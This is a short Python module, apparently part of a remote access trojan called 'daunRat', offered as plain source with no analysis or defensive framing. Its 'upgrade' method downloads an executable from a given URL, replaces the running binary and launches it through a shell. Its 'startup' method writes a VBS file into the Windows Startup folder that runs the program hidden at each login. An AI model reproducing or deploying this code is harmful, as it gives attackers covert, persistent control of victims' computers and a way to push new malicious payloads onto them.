import psutil


class daunrat:
    @staticmethod
    def upgrade(url: str, old: str = "daunRat.exe", destination: str = "daunRat.exe", command: str = "daunRat.exe"):
        import requests
        import subprocess
        import sys
        import os
        os.rename(old, "olddaun")
        with open(destination, 'wb') as f:
            f.write(requests.get(url).content)
        subprocess.Popen(command, shell=True, close_fds=True)
        sys.exit(0)

    @staticmethod
    def restart(command: str):
        import subprocess
        import sys
        subprocess.Popen(command, shell=True, close_fds=True)
        sys.exit(0)

    @staticmethod
    def startup(path: str = psutil.Process().exe(), startupname: str = "daunRat", copy_to: str = None,
                copy_from: str = None):
        import os.path
        if copy_to and copy_from:
            import shutil
            shutil.copy(copy_from, copy_to)
            path = copy_to
        with open(os.path.expandvars(f"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\\{startupname}.vbs"),
                  "w+") as f:
            f.write(f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "{path} ""--start""", 0
Set WshShell = Nothing''')
